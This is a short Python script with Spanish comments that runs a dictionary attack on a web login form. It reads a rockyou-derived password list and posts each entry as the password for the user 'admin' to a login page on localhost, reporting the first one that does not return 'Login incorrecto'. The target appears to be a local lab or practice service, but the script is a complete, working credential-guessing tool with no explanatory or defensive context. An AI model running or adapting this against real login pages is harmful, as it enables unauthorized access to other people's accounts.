import requests

# URL del formulario de login
url = 'http://localhost:14003/login'

# Usuario objetivo
username = 'admin'

# Ruta al diccionario rockyou
diccionario = './rockyou2k'

with open(diccionario, 'r', encoding='latin-1') as f:
    for i, password in enumerate(f):
        password = password.strip()

        # Enviamos la petición POST
        response = requests.post(url, data={
            'username': username,
            'password': password
        })

        # Si el login fue exitoso, la respuesta no tendrá "Login incorrecto"
        if "Login incorrecto" not in response.text:
            print(f"[+] Contraseña encontrada: {password}")
            break

        # Mostrar progreso cada 100 intentos
        if i % 100 == 0:
            print(f"Probadas {i} contraseñas...")

    else:
        print("[-] Contraseña no encontrada en el diccionario.")





        